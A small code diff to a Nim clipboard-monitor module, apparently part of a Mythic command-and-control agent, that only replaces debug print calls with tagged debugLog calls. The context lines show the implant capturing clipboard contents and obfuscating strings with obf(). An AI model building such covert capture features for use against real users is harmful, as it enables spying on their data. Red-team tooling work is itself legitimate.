@@ -63,7 +63,7 @@ proc clipboardMonitor*(taskId: string, params: JsonNode): JsonNode =
       if clipboardMonitorActive:
         return mythicError(taskId, obf("Clipboard monitor is already running"))
       
-      debug &"[DEBUG] Starting clipboard monitor for {args.duration} seconds (non-blocking)"
+      debugLog "clipboard_monitor", &"Starting clipboard monitor for {args.duration} seconds (non-blocking)"
       
       # Initialize monitoring state
       clipboardMonitorState = ClipboardMonitorState(
@@ -114,7 +114,7 @@ proc checkClipboardMonitor*(taskId: string): JsonNode =
         clipboardMonitorState.output.add(output)
         clipboardMonitorState.lastClip = currentClip
         
-        debug "[DEBUG] New clipboard content detected, returning immediately"
+        debugLog "clipboard_monitor", "New clipboard content detected, returning immediately"
         
         # Return immediately with new clipboard data (still processing)
         return %*{
@@ -135,7 +135,7 @@ proc checkClipboardMonitor*(taskId: string): JsonNode =
       else:
         finalOutput = obf("Clipboard monitoring completed. Total unique entries captured: ") & $clipboardMonitorState.seenClips.len
       
-      debug "[DEBUG] Clipboard monitoring completed"
+      debugLog "clipboard_monitor", "Clipboard monitoring completed"
       
       return mythicSuccess(taskId, finalOutput)
     
